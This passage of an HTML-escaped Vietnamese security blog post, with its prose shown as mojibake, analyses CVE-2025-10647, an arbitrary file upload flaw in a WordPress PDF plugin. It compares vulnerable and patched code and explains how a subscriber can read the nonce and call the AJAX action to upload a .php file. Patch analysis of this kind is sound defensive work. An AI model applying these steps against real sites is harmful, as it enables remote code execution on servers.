&lt;strong&gt;Subscriber&lt;/strong&gt; tr·ªü l√™n, t·∫£i l√™n c√°c file t√πy √Ω l√™n server c·ªßa site b·ªã ·∫£nh h∆∞·ªüng, v√† c√≥ th·ªÉ d·∫´n ƒë·∫øn &lt;strong&gt;remote code execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10647&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10647&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/embed-pdf-wpforms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed PDF for WPForms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Embed PDF for WPForms&lt;/strong&gt;: &lt;strong&gt;1.1.5&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.1.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/wpforms-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WPForms Plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function ajax_handler_download_pdf_media() {&#xA;    check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&#xA;&#xA;    if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;        wp_send_json_error();&#xA;    }&#xA;&#xA;    $url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&#xA;&#xA;    // Download the file.&#xA;    $tmp_file = download_url( $url );&#xA;    if ( is_wp_error( $tmp_file ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                /* translators: 1. An error message. */&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;            )&#xA;        );&#xA;    }&#xA;    // Move from a temp file to the uploads directory.&#xA;    $upload_dir = wp_upload_dir();&#xA;    $file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;    $path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&#xA;    global $wp_filesystem;&#xA;    if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;    }&#xA;    WP_Filesystem();&#xA;    $wp_filesystem-&amp;gt;move( $tmp_file, $path );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; t·∫£i m·ªôt file PDF t·ª´ URL ƒë∆∞·ª£c cung c·∫•p v√†o Media Library c·ªßa WordPress th√¥ng qua AJAX nh∆∞ng kh√¥ng ki·ªÉm tra lo·∫°i file, kh√¥ng ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Attacker c√≥ th·ªÉ upload file &lt;code&gt;.php&lt;/code&gt; ƒë·ªÉ th·ª±c hi·ªán RCE&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;public function ajax_handler_download_pdf_media() {&#xA;    check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&#xA;&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;        wp_send_json_error();&#xA;    }&#xA;&#xA;    $url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&#xA;&#xA;    if ( ! wp_check_filetype( basename( $url ) )[&amp;#39;type&amp;#39;] ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    // Download the file.&#xA;    $tmp_file = download_url( $url );&#xA;    if ( is_wp_error( $tmp_file ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                /* translators: 1. An error message. */&#xA;                &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;            )&#xA;        );&#xA;    }&#xA;    // Move from a temp file to the uploads directory.&#xA;    $upload_dir = wp_upload_dir();&#xA;    $file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;    $path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&#xA;    global $wp_filesystem;&#xA;    if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;        require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;    }&#xA;    WP_Filesystem();&#xA;    $wp_filesystem-&amp;gt;move( $tmp_file, $path );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ cho ph√©p user c√≥ quy·ªÅn upload m·ªõi ƒë∆∞·ª£c g·ªçi handler.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ch·ªâ ch·∫•p nh·∫≠n m·ªôt s·ªë lo·∫°i file ƒë∆∞·ª£c t·∫£i l√™n&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_check_filetype( basename( $url ) )[&amp;#39;type&amp;#39;] ) { &#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;msg&amp;#39; =&amp;gt; __( &amp;#39;The download failed&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_check_filetype/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_check_filetype()&lt;/code&gt;&lt;/a&gt; thu·ªôc WP Core tr·∫£ v·ªÅ 2 key ch√≠nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array(&#xA;    &amp;#39;ext&amp;#39;  =&amp;gt; string|false, &#xA;    &amp;#39;type&amp;#39; =&amp;gt; string|false&#xA;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;code&gt;type&lt;/code&gt; kh√¥ng thu·ªôc &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_get_mime_types/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_get_mime_types()&lt;/code&gt;&lt;/a&gt; th√¨ tr·∫£ v·ªÅ false. M·∫∑c ƒë·ªãnh ch·ªâ ch·∫•p nh·∫≠n c√°c file kh√¥ng th·ª±c thi ƒë∆∞·ª£c (Kh√¥ng ch·∫•p nh·∫≠n &lt;code&gt;php&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;H√†m &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Check &lt;code&gt;nonce&lt;/code&gt; ch·ªëng CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;epdf_wf_download_pdf_media&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;epdf_wf_download_pdf_media&lt;/code&gt; trong th∆∞ m·ª•c ch·ª©a m√£ ngu·ªìn c·ªßa plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/nonce_create.png&#34; title=&#34;Nonce ƒë∆∞·ª£c t·∫°o v·ªõi key `_ajax_nonce`&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;Nonce ƒë∆∞·ª£c t·∫°o v·ªõi key `_ajax_nonce`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;390&#34; width=&#34;1591&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce ƒë∆∞·ª£c t·∫°o v·ªõi key `_ajax_nonce`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce ƒë∆∞·ª£c t·∫°o c√≥ key l√† &lt;code&gt;_ajax_nonce&lt;/code&gt; ƒë∆∞·ª£c l∆∞u tr·ªØ b·ªüi Object &lt;code&gt;epdf_wf_pdf_viewer_strings&lt;/code&gt; =&amp;gt; c√≥ th·ªÉ l·∫•y gi√° tr·ªã c·ªßa &lt;code&gt;_ajax_nonce&lt;/code&gt; trong console c·ªßa tr√¨nh duy·ªát b·∫±ng c√°ch g·ªçi &lt;code&gt;epdf_wf_pdf_viewer_strings.nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/get_nonce.png&#34; title=&#34;L·∫•y nonce t·ª´ console tr√¨nh duy·ªát&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get Nonce&lt;/h2&gt;&lt;p&gt;L·∫•y nonce t·ª´ console tr√¨nh duy·ªát&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/get_nonce.png&#39; alt=&#34;Get Nonce&#34; height=&#34;728&#34; width=&#34;1097&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y nonce t·ª´ console tr√¨nh duy·ªát&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nonce n√†y ƒë∆∞·ª£c t·∫°o sau khi truy c·∫≠p trang ƒë∆∞·ª£c t·∫°o b·∫±ng &lt;strong&gt;WPForms&lt;/strong&gt; s·ª≠ d·ª•ng &lt;strong&gt;PDF Viewer&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/create_form.png&#34; title=&#34;T·∫°o form b·∫±ng WPForms s·ª≠ d·ª•ng PDF Viewer&#34; data-thumbnail=&#34;/posts/2025-11-06-cve-2025-10647/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;T·∫°o form b·∫±ng WPForms s·ª≠ d·ª•ng PDF Viewer&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-06-cve-2025-10647/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;728&#34; width=&#34;1097&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o form b·∫±ng WPForms s·ª≠ d·ª•ng PDF Viewer&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Form ƒë∆∞·ª£c t·∫°o s·∫Ω embed v√†o Post/Page c·ªßa WordPress&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra d·ªØ li·ªáu g·ª≠i l√™n&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( empty( $_POST[&amp;#39;url&amp;#39;] ) ) {&#xA;    wp_send_json_error();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu request kh√¥ng c√≥ url, h√†m s·∫Ω tr·∫£ v·ªÅ JSON l·ªói v√† d·ª´ng th·ª±c thi.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;L·∫•y v√† l√†m s·∫°ch URL&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$url = esc_url_raw( wp_unslash( $_POST[&amp;#39;url&amp;#39;] ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_unslash()&lt;/code&gt; lo·∫°i b·ªè slash escape (WordPress t·ª± th√™m escape khi g·ª≠i POST).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;esc_url_raw()&lt;/code&gt; l√†m s·∫°ch URL ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n tr∆∞·ªõc khi d√πng ƒë·ªÉ t·∫£i file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;T·∫£i file v·ªÅ server (temporary)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$tmp_file = download_url( $url );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;download_url()&lt;/code&gt; t·∫£i file t·ª´ URL v·ªÅ file t·∫°m th·ªùi tr√™n server.&lt;/li&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n t·ªõi file t·∫°m n·∫øu th√†nh c√¥ng, ho·∫∑c &lt;code&gt;WP_Error&lt;/code&gt; n·∫øu th·∫•t b·∫°i.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_wp_error( $tmp_file ) ) {&#xA;    wp_send_json_error(&#xA;        array(&#xA;            &amp;#39;msg&amp;#39; =&amp;gt; sprintf( __( &amp;#39;The download failed with error &amp;#34;%s&amp;#34;&amp;#39;, &amp;#39;embed-pdf-wpforms&amp;#39; ), $tmp_file-&amp;gt;get_error_message() ),&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu download th·∫•t b·∫°i ‚Üí tr·∫£ v·ªÅ JSON l·ªói k√®m th√¥ng b√°o l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;X√°c ƒë·ªãnh th∆∞ m·ª•c upload v√† t√™n file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload_dir = wp_upload_dir(); &#xA;$file_name  = wp_unique_filename( $upload_dir[&amp;#39;path&amp;#39;], basename( $url ) );&#xA;$path       = $upload_dir[&amp;#39;path&amp;#39;] . DIRECTORY_SEPARATOR . $file_name;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_upload_dir()&lt;/code&gt; tr·∫£ v·ªÅ m·∫£ng th√¥ng tin th∆∞ m·ª•c uploads: path, URL, subdir, ‚Ä¶&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_unique_filename()&lt;/code&gt; ƒë·∫£m b·∫£o t√™n file kh√¥ng tr√πng v·ªõi c√°c file ƒë√£ c√≥.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path&lt;/code&gt; l√† ƒë∆∞·ªùng d·∫´n ƒë·∫ßy ƒë·ªß n∆°i file s·∫Ω ƒë∆∞·ª£c l∆∞u.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$upload_dir[&#39;path&#39;]&lt;/code&gt; th∆∞·ªùng c√≥ d·∫°ng l√† &lt;code&gt;wp-content/uploads/year/month&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Kh·ªüi t·∫°o h·ªá th·ªëng Filesystem c·ªßa WordPress&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;global $wp_filesystem;&#xA;&#xA;if ( ! class_exists( &amp;#39;WP_Filesystem&amp;#39; ) ) {&#xA;    require_once ABSPATH . &amp;#39;/wp-admin/includes/file.php&amp;#39;;&#xA;}&#xA;&#xA;WP_Filesystem();&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Di chuy·ªÉn file t·∫°m sang th∆∞ m·ª•c uploads&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_filesystem-&amp;gt;move( $tmp_file, $path );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Di chuy·ªÉn file t·ª´ &lt;code&gt;temp ($tmp_file)&lt;/code&gt; sang &lt;code&gt;uploads ($path)&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng &lt;code&gt;$wp_filesystem-&amp;gt;move()&lt;/code&gt; thay v√¨ &lt;code&gt;rename()&lt;/code&gt; ƒë·ªÉ t∆∞∆°ng th√≠ch m·ªçi m√¥i tr∆∞·ªùng (&lt;code&gt;Direct&lt;/code&gt;, &lt;code&gt;FTP&lt;/code&gt;, &lt;code&gt;‚Ä¶&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; ƒë∆∞·ª£c dƒÉng k√Ω l√†m callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_epdf_wf_download_pdf_media&amp;#39;, array( $this, &amp;#39;ajax_handler_download_pdf_media&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; y√™u c·∫ßu ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p(t·ªëi thi·∫øu l√† &lt;code&gt;Subcriber&lt;/code&gt;) m·ªõi ƒë∆∞·ª£c g·ª≠i request ƒë∆∞∆°c ch·∫•p nh·∫≠n&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;epdf_wf_download_pdf_media&lt;/code&gt; l√† action ƒë∆∞·ª£c truy·ªÅn trong param&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p g·ª≠i request ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=epdf_wf_download_pdf_media&lt;/code&gt; th√¨ &lt;code&gt;ajax_handler_download_pdf_media()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω request&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 